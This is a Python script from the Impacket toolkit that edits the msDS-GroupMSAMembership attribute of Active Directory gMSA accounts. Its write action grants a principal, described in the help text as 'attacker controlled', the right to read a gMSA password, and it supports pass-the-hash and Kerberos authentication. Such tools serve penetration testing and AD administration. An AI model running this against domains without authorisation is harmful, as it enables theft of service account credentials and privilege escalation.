#!/usr/bin/env python3
# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies 
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   Python script for handling the msDS-GroupMSAMembership property of a target gMSA account.
#
# Author:
#   Niket (https://github.com/int3x)
#
# Adopted from code of:
#   Remi Gascou (@podalirius_)
#   Charlie Bromberg (@_nwodtuhs)
#


import argparse
import logging
import sys
import traceback
import ldap3
import ldapdomaindump
from ldap3.protocol.formatters.formatters import format_sid

from impacket import version
from impacket.examples import logger, utils
from impacket.ldap import ldaptypes
from ldap3.utils.conv import escape_filter_chars

from impacket.examples.utils import init_ldap_session, parse_identity

def create_empty_sd():
    sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
    sd['Revision'] = b'\x01'
    sd['Sbz1'] = b'\x00'
    sd['Control'] = 32772
    sd['OwnerSid'] = ldaptypes.LDAP_SID()
    # BUILTIN\Administrators
    sd['OwnerSid'].fromCanonical('S-1-5-32-544')
    sd['GroupSid'] = b''
    sd['Sacl'] = b''
    acl = ldaptypes.ACL()
    acl['AclRevision'] = 4
    acl['Sbz1'] = 0
    acl['Sbz2'] = 0
    acl.aces = []
    sd['Dacl'] = acl
    return sd


# Create an ALLOW ACE with the specified sid
def create_allow_ace(sid):
    nace = ldaptypes.ACE()
    nace['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
    nace['AceFlags'] = 0x00
    acedata = ldaptypes.ACCESS_ALLOWED_ACE()
    acedata['Mask'] = ldaptypes.ACCESS_MASK()
    acedata['Mask']['Mask'] = 983551  # Full control
    acedata['Sid'] = ldaptypes.LDAP_SID()
    acedata['Sid'].fromCanonical(sid)
    nace['Ace'] = acedata
    return nace


class GMSA(object):
    """docstring for class GMSA"""

    def __init__(self, ldap_server, ldap_session, gmsa_account):
        super(GMSA, self).__init__()
        self.ldap_server = ldap_server
        self.ldap_session = ldap_session
        self.principal = None
        self.gmsa_account = gmsa_account
        self.SID_principal = None
        self.DN_gmsa_account = None
        logging.debug('Initializing domainDumper()')
        cnf = ldapdomaindump.domainDumpConfig()
        cnf.basepath = None
        self.domain_dumper = ldapdomaindump.domainDumper(self.ldap_server, self.ldap_session, cnf)

    def read(self):
        # Get gMSA account DN
        result = self.get_user_info(self.gmsa_account)
        if not result:
            logging.error('Target gMSA account does not exist! (forgot "$" for a computer account? wrong domain?)')
            return
        self.DN_gmsa_account = result[0]

        # Get list of entities allowed to read the gMSA password
        self.get_gmsa_membership()

        return

    def write(self, principal):
        self.principal = principal

        # Get principal user sid
        result = self.get_user_info(self.principal)
        if not result:
            logging.error('Principal account does not exist! (forgot "$" for a computer account? wrong domain?)')
            return
        self.SID_principal = str(result[1])

        # Get gMSA account DN
        result = self.get_user_info(self.gmsa_account)
        if not result:
            logging.error('Target gMSA account does not exist! (forgot "$" for a computer account? wrong domain?)')
            return
        self.DN_gmsa_account = result[0]

        # Get list of entities allowed to read the gMSA password and build security descriptor including previous data
        sd, targetuser = self.get_gmsa_membership()

        # writing only if SID not already in list
        if self.SID_principal not in [ ace['Ace']['Sid'].formatCanonical() for ace in sd['Dacl'].aces ]:
            sd['Dacl'].aces.append(create_allow_ace(self.SID_principal))
            self.ldap_session.modify(targetuser['dn'],
                                     {'msDS-GroupMSAMembership': [ldap3.MODIFY_REPLACE,
                                                                                   [sd.getData()]]})
            if self.ldap_session.result['result'] == 0:
                logging.info('Rights modified successfully!')
                logging.info('%s can now read gMSA password for %s', self.principal, self.gmsa_account)
            else:
                if self.ldap_session.result['result'] == 50:
                    logging.error('Could not modify object, the server reports insufficient rights: %s',
                                  self.ldap_session.result['message'])
                elif self.ldap_session.result['result'] == 19:
                    logging.error('Could not modify object, the server reports a constrained violation: %s',
                                  self.ldap_session.result['message'])
                else:
                    logging.error('The server returned an error: %s', self.ldap_session.result['message'])
        else:
            logging.info('%s can already read the gMSA password for %s', self.principal, self.gmsa_account)
            logging.info('Not modifying the rights.')
        # Get list of entities allowed to read the gMSA password
        self.get_gmsa_membership()
        return

    def remove(self, principal):
        self.principal = principal

        # Get principal user sid
        result = self.get_user_info(self.principal)
        if not result:
            logging.error('Principal account does not exist! (forgot "$" for a computer account? wrong domain?)')
            return
        self.SID_principal = str(result[1])

        # Get gMSA account DN
        result = self.get_user_info(self.gmsa_account)
        if not result:
            logging.error('Target gMSA account does not exist! (forgot "$" for a computer account? wrong domain?)')
            return
        self.DN_gmsa_account = result[0]

        # Get list of entities allowed to read the gMSA password and build security descriptor including that data
        sd, targetuser = self.get_gmsa_membership()

        # Remove the entries where SID match the given -principal
        sd['Dacl'].aces = [ace for ace in sd['Dacl'].aces if self.SID_principal != ace['Ace']['Sid'].formatCanonical()]
        self.ldap_session.modify(targetuser['dn'],
                                 {'msDS-GroupMSAMembership': [ldap3.MODIFY_REPLACE, [sd.getData()]]})

        if self.ldap_session.result['result'] == 0:
            logging.info('Rights modified successfully!')
        else:
            if self.ldap_session.result['result'] == 50:
                logging.error('Could not modify object, the server reports insufficient rights: %s',
                              self.ldap_session.result['message'])
            elif self.ldap_session.result['result'] == 19:
                logging.error('Could not modify object, the server reports a constrained violation: %s',
                              self.ldap_session.result['message'])
            else:
                logging.error('The server returned an error: %s', self.ldap_session.result['message'])
        # Get list of entities allowed to read the gMSA password
        self.get_gmsa_membership()
        return

    def flush(self):
        # Get gMSA account DN
        result = self.get_user_info(self.gmsa_account)
        if not result:
            logging.error('Target gMSA account does not exist! (forgot "$" for a computer account? wrong domain?)')
            return
        self.DN_gmsa_account = result[0]

        # Get list of entities allowed to read the gMSA password
        sd, targetuser = self.get_gmsa_membership()

        self.ldap_session.modify(targetuser['dn'], {'msDS-GroupMSAMembership': [ldap3.MODIFY_REPLACE, []]})
        if self.ldap_session.result['result'] == 0:
            logging.info('Rights flushed successfully!')
        else:
            if self.ldap_session.result['result'] == 50:
                logging.error('Could not modify object, the server reports insufficient rights: %s',
                              self.ldap_session.result['message'])
            elif self.ldap_session.result['result'] == 19:
                logging.error('Could not modify object, the server reports a constrained violation: %s',
                              self.ldap_session.result['message'])
            else:
                logging.error('The server returned an error: %s', self.ldap_session.result['message'])
        # Get list of entities allowed to read the gMSA password
        self.get_gmsa_membership()
        return

    def get_gmsa_membership(self):
        # Get target's msDS-GroupMSAMembership attribute
        self.ldap_session.search(self.DN_gmsa_account, '(objectClass=*)', search_scope=ldap3.BASE,
                                 attributes=['SAMAccountName', 'objectSid', 'msDS-GroupMSAMembership'])
        targetuser = None
        for entry in self.ldap_session.response:
            if entry['type'] != 'searchResEntry':
                continue
            targetuser = entry
        if not targetuser:
            logging.error('Could not query target account properties')
            return

        try:
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(
                data=targetuser['raw_attributes']['msDS-GroupMSAMembership'][0])
            if len(sd['Dacl'].aces) > 0:
                logging.info('Accounts allowed to read gMSA password:')
                for ace in sd['Dacl'].aces:
                    SID = ace['Ace']['Sid'].formatCanonical()
                    SidInfos = self.get_sid_info(ace['Ace']['Sid'].formatCanonical())
                    if SidInfos:
                        SamAccountName = SidInfos[1]
                        logging.info('    %-10s   (%s)' % (SamAccountName, SID))
            else:
                logging.info('Attribute msDS-GroupMSAMembership is empty')
        except IndexError:
            logging.info('Attribute msDS-GroupMSAMembership is empty')
            # Create DACL manually
            sd = create_empty_sd()
        return sd, targetuser

    def get_user_info(self, samname):
        self.ldap_session.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(samname), attributes=['objectSid'])
        try:
            dn = self.ldap_session.entries[0].entry_dn
            sid = format_sid(self.ldap_session.entries[0]['objectSid'].raw_values[0])
            return dn, sid
        except IndexError:
            logging.error('User not found in LDAP: %s' % samname)
            return False

    def get_sid_info(self, sid):
        self.ldap_session.search(self.domain_dumper.root, '(objectSid=%s)' % escape_filter_chars(sid), attributes=['samaccountname'])
        try:
            dn = self.ldap_session.entries[0].entry_dn
            samname = self.ldap_session.entries[0]['samaccountname']
            return dn, samname
        except IndexError:
            logging.error('SID not found in LDAP: %s' % sid)
            return False


def parse_args():
    parser = argparse.ArgumentParser(add_help=True,
                                     description='Python (re)setter for property msDS-GroupMSAMembership')
    parser.add_argument('identity', action='store', help='domain.local/username[:password]')
    parser.add_argument("-gmsa-account", type=str, required=True,
                        help="Target gMSA account whose msDS-GroupMSAMembership is to be read/edited/etc.")
    parser.add_argument("-principal", type=str, required=False,
                        help="Attacker controlled account to write on the gMSAmembership property of target gMSA account (only when using `-action write`)")
    parser.add_argument('-action', choices=['read', 'write', 'remove', 'flush'], nargs='?', default='read',
                        help='Action to operate on msDS-GroupMSAMembership')

    parser.add_argument('-use-ldaps', action='store_true', help='Use LDAPS instead of LDAP')

    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true",
                       help='Use Kerberos authentication. Grabs credentials from ccache file '
                            '(KRB5CCNAME) based on target parameters. If valid credentials '
                            'cannot be found, it will use the ones specified in the command '
                            'line')
    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
                                                                          '(128 or 256 bits)')

    group = parser.add_argument_group('connection')

    group.add_argument('-dc-ip', action='store', metavar="ip address",
                       help='IP Address of the domain controller or KDC (Key Distribution Center) for Kerberos. If '
                            'omitted it will use the domain part (FQDN) specified in '
                            'the identity parameter')
    group.add_argument('-dc-host', action='store', metavar="hostname", help='Hostname of the domain controller or KDC (Key Distribution Center) for Kerberos. If omitted, -dc-ip will be used')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    return parser.parse_args()


def main():
    print(version.BANNER)
    args = parse_args()
    logger.init(args.ts, args.debug)

    if args.action == 'write' and args.principal is None:
        logging.critical('`-principal` should be specified when using `-action write` !')
        sys.exit(1)

    domain, username, password, lmhash, nthash, args.k = parse_identity(args.identity, args.hashes, args.no_pass, args.aesKey, args.k)

    try:
        ldap_server, ldap_session = init_ldap_session(domain, username, password, lmhash, nthash, args.k, args.dc_ip, args.dc_host, args.aesKey, args.use_ldaps)
        gmsa = GMSA(ldap_server, ldap_session, args.gmsa_account)
        if args.action == 'read':
            gmsa.read()
        elif args.action == 'write':
            gmsa.write(args.principal)
        elif args.action == 'remove':
            gmsa.remove(args.principal)
        elif args.action == 'flush':
            gmsa.flush()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            traceback.print_exc()
        logging.error(str(e))


if __name__ == '__main__':
    main()
